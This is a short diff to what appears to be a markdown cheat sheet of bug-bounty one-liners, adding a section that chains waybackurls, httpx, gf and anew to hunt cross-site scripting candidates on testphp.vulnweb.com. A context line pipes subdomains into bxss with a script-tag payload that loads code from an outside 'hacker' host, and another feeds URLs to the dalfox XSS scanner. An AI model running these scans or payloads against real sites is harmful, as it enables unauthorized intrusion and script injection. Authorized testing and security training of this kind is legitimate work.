@@ -56,6 +56,12 @@ subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.
 echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
 ```
 
+## XSS using gf
+> @infosecMatter
+```
+echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
+```
+
 ## XSS without gf
 > HacktifyS
 ```
